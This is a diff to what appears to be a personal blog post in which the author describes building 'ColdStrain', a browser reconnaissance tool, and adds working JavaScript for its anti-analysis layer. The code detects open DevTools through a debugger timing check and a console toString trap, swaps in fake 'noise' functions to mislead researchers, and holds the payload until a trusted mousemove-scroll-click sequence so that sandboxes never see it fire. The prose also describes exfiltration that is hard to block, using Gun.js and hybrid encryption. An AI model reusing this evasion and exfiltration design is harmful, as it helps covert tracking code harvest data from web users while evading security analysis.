@@ -953,8 +953,113 @@ const probeIp = async (ip) => {
         iframe.src = \`http://\${ip}:31337\`; 
     });
 };</pre>
+   <p>then i added the other features like NAT topology identification feature, then were several sophisticated anti-analysis features, the first was a <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker, then there was a feature for <b>DevTools</b> detection where the code records the exact millisecond before and after a debugger; statement using <code>performance.now()</code>. in a normal environment, the script ignores this and executes it in less than a millisecond. If DevTools is open, the script halts execution. If the time delta exceeds 100ms, the script assumes a human is inspecting the code, and then a Chromium specific thing, the script creates a custom object with a modified <code>toString()</code> method that sets a flag (<code>detected = true</code>) when called. it then logs this object to the console using <code>console.log('%c', detector);</code>. in Chromium-based browsers (Chrome, Edge), the console automatically evaluates and stringifies objects to display them. if the console is closed, the object is never evaluated, and the trap remains untriggered. the second one is deceptive 'noise' method, where instead of terminating the script when analysis is detected (which is a strong indicator of malicious intent), ColdStrain utilizes <b>Dynamic Method Swapping</b> to feed the researcher fake data.</p>
+   <pre>async _isDevToolsOpen() {
+        // Trap 1: Execution pause (Works across all browsers)
+        const start = performance.now();
+        debugger; 
+        const end = performance.now();
+        if (end - start > 100) return true;
 
-   <p>then i added the other features like NAT topology identification feature, the a pretty powerful anti-analysis features like an <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker. then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
+        // Trap 2: toString() evaluation (Only safe to run on Chromium-based browsers)
+        const isChromium = !!window.chrome;
+        if (isChromium) {
+            let detected = false;
+            const detector = {
+                toString: () => { detected = true; return 'detector'; }
+            };
+            console.log('%c', detector); 
+            return detected;
+        }</pre>
+        <pre>this._noiseFunctions = {
+            harvest: () => Promise.resolve({ error: "ERR_ENCRYPT_FAIL", nonce: Math.random().toString(36) }),
+            syncToMesh: () => {},
+            getDeepMediaTelemetry: () => Promise.resolve({ status: "IDLE", hardware: "GENERIC_PnP" })
+        };</pre>
+        <pre>async _checkIntegrity() {
+        const isOpen = await this._isDevToolsOpen();
+
+        if (isOpen && !this._isShielded) {
+            this._applyNoise();
+        } else if (!isOpen && this._isShielded) {
+            this._restoreLogic();
+        }
+    }
+    
+    _applyNoise() {
+        this._isShielded = true;
+
+        Object.keys(this._noiseFunctions).forEach(m => {
+            this[m] = this._noiseFunctions[m];
+        });
+    }</pre>
+    <pre>armOnMultiInteraction() {
+        
+
+        let interactionState = 0;
+        let sequenceTimeout = null;
+
+
+        const resetSequence = () => {
+            if (interactionState > 0) {
+                
+            }
+            interactionState = 0;
+            if (sequenceTimeout) {
+                clearTimeout(sequenceTimeout);
+                sequenceTimeout = null;
+            }
+        };
+
+        const triggerRecon = async () => {
+            console.log("[!] Complex human interaction verified. Executing payload...");
+            
+
+            window.removeEventListener('mousemove', handleMouse);
+            window.removeEventListener('scroll', handleScroll);
+            window.removeEventListener('click', handleClick);
+            clearTimeout(sequenceTimeout);
+            
+
+            try {
+                await this.syncToMesh();
+                
+            } catch (error) { }
+        };
+
+
+        const handleMouse = () => {
+            if (interactionState === 0) {
+                interactionState = 1; 
+                sequenceTimeout = setTimeout(resetSequence, 5000); 
+            }
+        };
+
+        const handleScroll = () => {
+            if (interactionState === 1) {
+                interactionState = 2; 
+            }
+        };
+
+        const handleClick = (event) => {
+            if (interactionState === 2) {
+
+                if (event.isTrusted && (event.clientX !== 0 || event.clientY !== 0)) {
+                    triggerRecon();
+                } else {
+                    
+                    resetSequence();
+                }
+            }
+        };
+
+
+        window.addEventListener('mousemove', handleMouse);
+
+        window.addEventListener('scroll', handleScroll, { passive: true }); 
+        window.addEventListener('click', handleClick);
+    }</pre>
+   <p>then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
              <p>but then i found that these techniques or at least the ones which leaked important stuff, could be mitigated in the modern web, so i made it a bit more robust, in which i added more newer and more subtle fallback features for several features which made the whole thing even more robust and difficult to mitigate, like i added the <code>WebGPU</code> fingerprinting as a fallback for WebGL, made the VPN detection a multi feature process where different ways where used to get the data for the VPN detection,as a step by step process and added a new <code>MTU</code> analysis feature with <code>WebTransport</code> which more difficult to catch.</p>
              <p>and with all these stuff, and 5 days of work, i created ColdStrain and ngl it was pretty sophisticated and effective for a web-based reconaissance tool....dw i didn't use it in this site, i really value privacy this was just a PoC for seeing how much of we could leak from a browser if we asked nicely.</p>`
         }
